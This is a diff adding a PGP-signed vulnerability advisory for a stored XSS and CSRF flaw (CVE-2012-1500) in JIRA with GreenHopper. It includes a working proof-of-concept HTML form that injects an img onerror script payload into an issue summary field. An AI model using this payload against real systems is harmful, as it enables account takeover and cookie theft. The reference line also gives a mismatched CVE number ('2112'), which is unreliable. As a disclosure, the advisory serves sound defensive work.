@@ -1,0 +1,97 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+
+Hash: SHA256
+
+
+CVE-2012-1500, Stored XSS in JIRA v4.4.3#663-r165197, GreenHopper
+Resolved in Version 5.9.8, Proof of Concept
+External References: CVE-2112-1500 CVE-2112-1500 XSS.Cx Blog GHS-5642
+Reported to Vendor on Mar 7, 2012, Resolved 8/22/2012
+XSS.Cx Research Award to Reporter: 1250 Euros
+
+Introduction
+
+JIRA (/'d???r?/ JEER-?) is a proprietary issue tracking product,
+developedby Atlassian, commonly used for bug tracking, issue tracking,
+and project management. It has been developed since 2002. JIRA is a
+commercial software product that can be licensed for running
+on-premises or available as a hosted solution.
+
+GreenHopper - GreenHopper unlocks the power of Agile, whether you're a
+seasoned Agile expert or just getting started. Creating user stories,
+estimating those stories for a sprint backlog, identifying team
+velocity, visualizing team activity and reporting progress has never
+been so easy.
+
+Exploit
+
+The Anonymous Researchers discovered a Stored XSS vulnerability
+allowing an attacker to inject arbitrary script code into an existing
+and fully patched JIRA + GreenHopper installations (JIRA=V4.4.3,
+GreenHopper prior to V5.9.8). The requirements for a successful attack
+are minimal. A user logged into the targeted JIRA issue tracking
+system needs to be convinced to visit an attacker controlled link.
+Once that link has been visited by the unsuspecting victim, an
+invisible form will perform a POST request and the victim will be
+redirected to a URL where username, password and login credentials
+such as cookies can be read and processed by the attacker. An attacker
+can obtain access to privileged accounts and get control over the JIRA
+issue tracker and connected systems.
+
+
+Proof of Concept Exploit Code
+
+
+Proof of Concept `
+
+// Form to inject payload via CSRF
+// Note: No CSRF tokens required
+<form action="http://server/secure/UpdateFieldJson.jspa"
+method="post">
+<input type=submit value="XSS">
+<input name="colPage" value="1">
+<input name="decorator" value="none">
+<input name="fieldId" value="summary">
+<input name="fieldValue" value="<img src=x onerror='alert(domain+/ --
+/+cookie)'>">
+<input name="id" value="20633">
+<input name="key" value="TST-3785">
+<input name="pageType" value="PlanningBoard">
+<input name="selectedBoardId" value="10000">
+<input name="selectedProjectid" value="10000">
+<input name="stepId" value="10000">
+<input name="subType" value="VersionBoard">
+<input name="type" value="VB">
+</form>
+
+
+// URL reflecting the injected data
+
+http://server/secure/EditField.jspa?id=20633&stepId=10000&fieldId=summary&decorator=none&selectedProjectid=10000&pageType=PlanningBoard&subType=VersionBoard&type=VB&selectedBoardId=10000&colPage=1&_=1330437353767
+
+
+Report proofed by 0xC8CA08F4 at Mar 07 08:49:59 EDT 2012.
+
+
+-----BEGIN PGP SIGNATURE-----
+
+Version: PGP Desktop 10.2.0 (Build 2599)
+
+Charset: utf-8
+
+
+wsBVAwUBUETjrHz+WcLIygj0AQiagAf+KRj8yHe/ozwRj/SrzO6sD9mfqs/sk1D8
+
+MHS2BSe5NoqK3EDz6gksCj7im7pgD/1d1KkOj7b+B+6e9HfkNvZ7oOTxM5xPmgwd
+
+9hWL2ogkIy8d5tqqpQ5DvmBsgp0COBFTU/hQLHzw6wp9frX+dSa0V9Z4yJNS96a1
+
+y3kNdviYlYNbQ9g/8WER7QxsWD5Qc1oNeByItrZNeHjsa4Ma2XiL48uc9K938EJe
+
+oHIWWBQK5AT08zQdpVcvtUpR18VO9qh2iIiP5Ucni9/A8SW+hKfTdOF/vBHzErqC
+
+Kr2sMRRh2IvTJ8VWLepTKKxpurv6JK5lMKH3VIw/OGlKrqlAXIW/2g==
+
+=ahFt
+
+-----END PGP SIGNATURE-----
